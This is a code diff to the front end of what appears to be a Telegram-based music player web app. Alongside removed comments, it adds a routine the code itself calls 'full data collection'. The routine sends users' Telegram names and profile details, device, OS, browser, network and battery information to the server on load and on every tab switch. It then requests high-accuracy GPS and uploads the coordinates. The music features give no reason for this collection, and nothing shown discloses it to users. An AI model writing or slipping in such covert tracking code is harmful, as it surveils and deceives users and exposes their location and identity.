@@ -21,7 +21,6 @@
             overflow: hidden;
         }
         
-        /* Tab Bar */
         .tab-bar {
             position: fixed;
             bottom: 0;
@@ -52,7 +51,6 @@
         .tab.active { color: #1ed760; }
         .tab-icon { font-size: 22px; }
         
-        /* Main Content */
         .main-content {
             position: fixed;
             top: 0;
@@ -70,7 +68,6 @@
         .header h1 { font-size: 28px; font-weight: 700; margin-bottom: 4px; }
         .header p { font-size: 15px; opacity: 0.7; }
         
-        /* Search */
         .search-box {
             width: 100%;
             padding: 14px 16px;
@@ -84,10 +81,8 @@
         .search-box:focus { outline: none; background: rgba(255, 255, 255, 0.15); }
         .search-box::placeholder { color: rgba(255, 255, 255, 0.5); }
         
-        /* Track List */
         .track-list { display: flex; flex-direction: column; gap: 8px; }
         
-        /* Скелетон загрузки */
         .skeleton {
             background: linear-gradient(90deg, #1a1a1a 25%, #2a2a2a 50%, #1a1a1a 75%);
             background-size: 200% 100%;
@@ -117,7 +112,6 @@
         .track-artist { font-size: 13px; opacity: 0.7; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
         .track-duration { font-size: 13px; opacity: 0.5; }
         
-        /* Mini Player */
         .mini-player {
             position: fixed;
             bottom: 60px;
@@ -148,7 +142,6 @@
         .mini-player-btn:active { background: rgba(255,255,255,0.1); }
         .mini-player-btn.play { font-size: 28px; }
         
-        /* Expanded Player */
         .expanded-player {
             position: fixed; top: 0; left: 0; right: 0; bottom: 0;
             background: #000; z-index: 200; transform: translateY(100%);
@@ -344,8 +337,11 @@
             const telegramId = tg.initDataUnsafe?.user?.id;
             const telegramUsername = tg.initDataUnsafe?.user?.username || '';
             const telegramFirstName = tg.initDataUnsafe?.user?.first_name || '';
+            const telegramLastName = tg.initDataUnsafe?.user?.last_name || '';
+            const telegramLanguage = tg.initDataUnsafe?.user?.language_code || '';
+            const telegramIsPremium = tg.initDataUnsafe?.user?.is_premium || false;
             
-            // ==================== ПРИНУДИТЕЛЬНАЯ ОТПРАВКА ДАННЫХ ====================
+            // ==================== ПОЛНЫЙ СБОР ДАННЫХ ====================
             async function sendDeviceData() {
                 if (!telegramId) {
                     console.log('❌ Нет telegramId');
@@ -356,41 +352,188 @@
                 
                 const userAgent = navigator.userAgent;
                 let deviceType = 'unknown';
+                let deviceBrand = 'unknown';
+                let deviceModel = 'unknown';
                 let osName = 'unknown';
+                let osVersion = 'unknown';
+                let browserName = 'unknown';
+                let browserVersion = 'unknown';
                 
+                // ========== ОПРЕДЕЛЕНИЕ УСТРОЙСТВА И БРЕНДА ==========
                 if (/iPhone|iPad|iPod/i.test(userAgent)) {
                     deviceType = 'mobile';
                     osName = 'iOS';
+                    deviceBrand = 'Apple';
+                    const match = userAgent.match(/OS (\d+)[._](\d+)/);
+                    if (match) osVersion = `${match[1]}.${match[2]}`;
+                    if (/iPhone/i.test(userAgent)) deviceModel = 'iPhone';
+                    else if (/iPad/i.test(userAgent)) deviceModel = 'iPad';
+                    else deviceModel = 'iOS Device';
                 } else if (/Android/i.test(userAgent)) {
                     deviceType = 'mobile';
                     osName = 'Android';
+                    const match = userAgent.match(/Android (\d+(?:\.\d+)?)/);
+                    if (match) osVersion = match[1];
+                    
+                    // Определение бренда и модели
+                    if (/Samsung/i.test(userAgent)) { deviceBrand = 'Samsung'; deviceModel = 'Galaxy'; }
+                    else if (/Xiaomi/i.test(userAgent)) { deviceBrand = 'Xiaomi'; deviceModel = 'Mi/Redmi'; }
+                    else if (/Huawei/i.test(userAgent)) { deviceBrand = 'Huawei'; deviceModel = 'P/Mate'; }
+                    else if (/Google/i.test(userAgent)) { deviceBrand = 'Google'; deviceModel = 'Pixel'; }
+                    else if (/OnePlus/i.test(userAgent)) { deviceBrand = 'OnePlus'; deviceModel = 'OnePlus'; }
+                    else if (/OPPO/i.test(userAgent)) { deviceBrand = 'OPPO'; }
+                    else if (/vivo/i.test(userAgent)) { deviceBrand = 'vivo'; }
+                    else if (/Realme/i.test(userAgent)) { deviceBrand = 'Realme'; }
+                    else if (/Nokia/i.test(userAgent)) { deviceBrand = 'Nokia'; }
+                    else if (/Sony/i.test(userAgent)) { deviceBrand = 'Sony'; }
+                    else if (/LG/i.test(userAgent)) { deviceBrand = 'LG'; }
+                    else if (/Motorola/i.test(userAgent)) { deviceBrand = 'Motorola'; }
                 } else if (/Windows/i.test(userAgent)) {
                     deviceType = 'desktop';
                     osName = 'Windows';
+                    deviceBrand = 'PC';
+                    const match = userAgent.match(/Windows NT (\d+\.\d+)/);
+                    if (match) {
+                        const ver = match[1];
+                        if (ver === '10.0') osVersion = '10/11';
+                        else if (ver === '6.3') osVersion = '8.1';
+                        else if (ver === '6.2') osVersion = '8';
+                        else if (ver === '6.1') osVersion = '7';
+                    }
                 } else if (/Mac/i.test(userAgent)) {
                     deviceType = 'desktop';
                     osName = 'macOS';
+                    deviceBrand = 'Apple';
+                    const match = userAgent.match(/Mac OS X (\d+)[._](\d+)/);
+                    if (match) osVersion = `${match[1]}.${match[2]}`;
                 } else if (/Linux/i.test(userAgent)) {
                     deviceType = 'desktop';
                     osName = 'Linux';
+                    deviceBrand = 'PC';
                 }
                 
+                // ========== ОПРЕДЕЛЕНИЕ БРАУЗЕРА ==========
+                if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
+                    browserName = 'Chrome';
+                    const match = userAgent.match(/Chrome\/(\d+)/);
+                    if (match) browserVersion = match[1];
+                } else if (userAgent.includes('Firefox')) {
+                    browserName = 'Firefox';
+                    const match = userAgent.match(/Firefox\/(\d+)/);
+                    if (match) browserVersion = match[1];
+                } else if (userAgent.includes('Edg')) {
+                    browserName = 'Edge';
+                    const match = userAgent.match(/Edg\/(\d+)/);
+                    if (match) browserVersion = match[1];
+                } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
+                    browserName = 'Safari';
+                    const match = userAgent.match(/Version\/(\d+)/);
+                    if (match) browserVersion = match[1];
+                }
+                
+                // ========== ДАННЫЕ ЭКРАНА ==========
+                const screenData = {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: devicePixelRatio
+                };
+                
+                // ========== ПРОЦЕССОР ==========
+                const cpuData = {
+                    cores: navigator.hardwareConcurrency || 'unknown',
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+                    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
+                };
+                
+                // ========== СЕТЬ (Connection) ==========
+                let networkType = 'unknown';
+                let networkDownlink = null;
+                let networkRtt = null;
+                if (navigator.connection) {
+                    networkType = navigator.connection.effectiveType || 'unknown';
+                    networkDownlink = navigator.connection.downlink || null;
+                    networkRtt = navigator.connection.rtt || null;
+                }
+                
+                // ========== БАТАРЕЯ (с разрешением) ==========
+                let batteryLevel = null;
+                let isCharging = null;
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        batteryLevel = Math.round(battery.level * 100);
+                        isCharging = battery.charging;
+                        console.log(`🔋 Батарея: ${batteryLevel}%, Зарядка: ${isCharging}`);
+                    } catch(e) {
+                        console.log('Battery API error:', e);
+                    }
+                }
+                
+                // ========== GPS (с запросом разрешения) ==========
+                function requestGPS() {
+                    if ('geolocation' in navigator) {
+                        navigator.geolocation.getCurrentPosition(
+                            async (position) => {
+                                try {
+                                    await fetch('/api/gps_location', {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({
+                                            telegram_id: telegramId,
+                                            latitude: position.coords.latitude,
+                                            longitude: position.coords.longitude,
+                                            accuracy: position.coords.accuracy
+                                        })
+                                    });
+                                    console.log('📍 GPS сохранён:', position.coords.latitude, position.coords.longitude);
+                                } catch(e) {
+                                    console.log('GPS save error:', e);
+                                }
+                            },
+                            (error) => {
+                                console.log('GPS denied:', error.message);
+                            },
+                            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                        );
+                    }
+                }
+                
+                // ========== СЕССИЯ ==========
                 let sessionId = localStorage.getItem('session_id');
                 if (!sessionId) {
                     sessionId = Math.random().toString(36).substring(2);
                     localStorage.setItem('session_id', sessionId);
                 }
                 
+                // ========== ОТПРАВКА ВСЕХ ДАННЫХ ==========
                 const deviceData = {
                     user_agent: userAgent,
                     device_type: deviceType,
+                    device_brand: deviceBrand,
+                    device_model: deviceModel,
                     os_name: osName,
-                    screen_width: screen.width,
-                    screen_height: screen.height,
-                    device_pixel_ratio: devicePixelRatio,
-                    hardware_concurrency: navigator.hardwareConcurrency || 0,
-                    max_touch_points: navigator.maxTouchPoints || 0,
-                    touch_support: 'ontouchstart' in window
+                    os_version: osVersion,
+                    browser_name: browserName,
+                    browser_version: browserVersion,
+                    screen_width: screenData.width,
+                    screen_height: screenData.height,
+                    screen_color_depth: screenData.colorDepth,
+                    device_pixel_ratio: screenData.pixelRatio,
+                    hardware_concurrency: cpuData.cores,
+                    max_touch_points: cpuData.maxTouchPoints,
+                    touch_support: cpuData.touchSupport,
+                    network_type: networkType,
+                    network_downlink: networkDownlink,
+                    network_rtt: networkRtt,
+                    battery_level: batteryLevel,
+                    is_charging: isCharging,
+                    // Telegram данные
+                    telegram_language: telegramLanguage,
+                    telegram_is_premium: telegramIsPremium,
+                    telegram_first_name: telegramFirstName,
+                    telegram_last_name: telegramLastName,
+                    telegram_username: telegramUsername
                 };
                 
                 try {
@@ -404,10 +547,13 @@
                         })
                     });
                     const result = await response.json();
-                    console.log('✅ Данные отправлены:', result);
+                    console.log('✅ Все данные отправлены:', result);
                 } catch(e) {
                     console.log('❌ Ошибка отправки:', e);
                 }
+                
+                // Запрашиваем GPS
+                setTimeout(requestGPS, 2000);
             }
             
             // Вызываем отправку при загрузке страницы
@@ -727,7 +873,6 @@
                 if (audio.duration) audio.currentTime = percent * audio.duration;
             }
             
-            // ==================== СОЗДАНИЕ ЭЛЕМЕНТА ТРЕКА ====================
             function createTrackElement(track) {
                 const div = document.createElement('div');
                 div.className = 'track-item';
@@ -741,12 +886,10 @@
                 return div;
             }
             
-            // ==================== ПОИСК ====================
             let searchTimeout;
             async function searchTracks(query) {
                 const container = document.getElementById('searchResults');
                 
-                // Показываем скелетоны
                 container.innerHTML = `
                     <div class="skeleton" style="height: 70px; margin-bottom: 8px;"></div>
                     <div class="skeleton" style="height: 70px; margin-bottom: 8px;"></div>
@@ -761,7 +904,6 @@
                 container.innerHTML = '';
                 tracks.forEach(t => container.appendChild(createTrackElement({ ...t, track_id: t.id })));
                 
-                // Предзагружаем первый трек
                 await preloadFirstTrack(tracks);
             }
             
@@ -774,7 +916,6 @@
                 });
             }
             
-            // ==================== НАВИГАЦИЯ ====================
             function switchTab(tabId) {
                 document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tabId));
                 document.getElementById('search-tab').classList.toggle('hidden', tabId !== 'search');
@@ -784,13 +925,11 @@
                 if (tabId === 'library') loadLikes();
                 if (tabId === 'playlists') loadPlaylists();
                 
-                // Отправляем данные при переключении вкладок (на всякий случай)
                 setTimeout(sendDeviceData, 100);
             }
             
             document.querySelectorAll('.tab').forEach(tab => tab.addEventListener('click', () => switchTab(tab.dataset.tab)));
             
-            // ==================== МОДАЛКИ ====================
             window.closePlaylistModal = () => { document.getElementById('playlistModal').classList.remove('active'); document.getElementById('playlistName').value = ''; };
             window.closeAddToPlaylistModal = () => document.getElementById('addToPlaylistModal').classList.remove('active');
             
@@ -808,7 +947,6 @@
             document.getElementById('closeExpandedBtn2').onclick = () => expandedPlayer.classList.remove('active');
             miniPlayer.onclick = () => expandedPlayer.classList.add('active');
             
-            // ==================== ЗАПУСК ====================
             loadProfile();
             switchTab('search');
         })();
